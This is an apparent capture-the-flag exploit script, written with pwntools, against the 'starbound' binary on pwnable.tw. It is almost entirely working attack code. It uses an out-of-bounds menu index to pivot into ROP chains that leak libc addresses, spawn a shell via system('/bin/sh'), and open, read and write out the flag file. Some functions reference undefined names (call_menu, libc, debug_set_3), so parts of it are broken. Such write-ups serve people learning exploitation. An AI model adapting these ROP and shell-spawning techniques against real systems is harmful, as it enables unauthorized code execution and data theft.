from pwn import *

pwnable = './starbound'

elf = ELF(pwnable)
context(terminal=['tmux', 'new-window'])
context(os = 'linux', arch = 'i386')

context.log_level = 'DEBUG'



debug_set = ''

debug_set_1 = '''
    b *0x0804a65d
    '''

if len(sys.argv) > 2 and sys.argv[1] == 'debug':
    p = process(pwnable)
    gdb.attach(p, debug_set_3)
elif len(sys.argv) > 1 and sys.argv[1] == 'debug':
    p = process(pwnable)
    gdb.attach(p, debug_set_1)
else:
    p = remote('chall.pwnable.tw', 10202)




def call_first_menu(index):
    p.recvuntil("7. Multiplayer\n>")
    p.sendline(index)

def call_second_menu(index):
    p.recvuntil("4. Toggle View\n>")
    p.sendline(index)

def call_name(name_rop, stack_rop):
    p.recvuntil("4. Toggle View\n>")
    p.sendline("2" + "aaaabaaacaaadaaaeaaafaa" + stack_rop)
    p.recvuntil("name:")
    p.sendline(name_rop + '/home/starbound/flag')


def leak(address):
    jump_puts = 1040097195 + (elf.got['puts']/4)
    jump_read = 1040097195 + (elf.got['read']/4)
    jump_bss = 1040097195 + (0x80580d0/4)

    read_plt = elf.plt['read']

    readn = 0x08049919
    rop_stack = 0x0804a5fe
    pop_ebx_edi = 0x0804a6dc
    mov_eax = 0x0804a6c3

    rop_chain = ROP(elf)
    rop_chain.call(rop_stack)


    rop_puts = ROP(elf)
    rop_puts.call(elf.plt['puts'], [address])
    rop_puts.call(elf.symbols['main'])


    call_first_menu("6")
    call_name(str(rop_chain), str(rop_puts))

    call_second_menu(str(jump_bss))


    one = p.recv()#why I need this wtf?
    data = p.recv(4)
    print("%#x => %s" % (address, (data or '').encode('hex')))
    return data

def exploit():
    jump_puts = 1040097195 + (elf.got['puts']/4)
    jump_read = 1040097195 + (elf.got['read']/4)
    jump_bss = 1040097195 + (0x80580d0/4)
    read_plt = elf.plt['read']
    readn = 0x08049919
    rop_stack = 0x0804a5fe
    pop_ebx_edi = 0x0804a6dc
    mov_eax = 0x0804a6c3
    rop_chain = ROP(elf)
    rop_chain.call(rop_stack)
    rop_puts = ROP(elf)
    rop_puts.call(elf.plt['puts'], [elf.got['puts']])
    rop_puts.call(elf.symbols['main'])
    print("rop_chain :: " + str(rop_chain))
    call_menu("6")
    call_name(str(rop_chain), str(rop_puts))
    call_menu(str(jump_bss))
    one = p.recv()#why I need this wtf?
    leaked_data = p.recv(4)
    leaked_puts = (u32(leaked_data))
    base = leaked_puts - libc.symbols['puts']
    libc.address = base
    print("puts :: " + hex(leaked_puts))
    bin_shell = libc.search('/bin/sh').next()
    system = libc.symbols['system']
    print("shell :: " + hex(bin_shell))
    rop_system = ROP(elf)
    rop_system.call(system, [bin_shell])
    call_menu("6")
    call_name(str(rop_chain), str(rop_system))
    call_menu(str(jump_bss))

def orw():
    jump_puts = 1040097195 + (elf.got['puts']/4)
    jump_read = 1040097195 + (elf.got['read']/4)
    jump_bss = 1040097195 + (0x80580d0/4)
    read_plt = elf.plt['read']
    readn = 0x08049919
    rop_stack = 0x0804a5fe
    pop_ebx_edi = 0x0804a6dc
    mov_eax = 0x0804a6c3
    rop_chain = ROP(elf)
    rop_chain.call(rop_stack)
    rop_puts = ROP(elf)
    rop_puts.call(elf.plt['open'], [0x80580d4, 0x00])
    rop_puts.call(elf.plt['read'], [0x3, 0x80580d0, 0x100])
    rop_puts.call(elf.plt['write'], [0x1, 0x80580d0, 0x100])
    rop_puts.call(elf.symbols['main'])
    print("rop_chain :: " + str(rop_chain))
    call_first_menu("6")
    call_name(str(rop_chain), str(rop_puts))
    call_second_menu(str(jump_bss))
    call_first_menu('1')

orw()
p.wait_for_close()

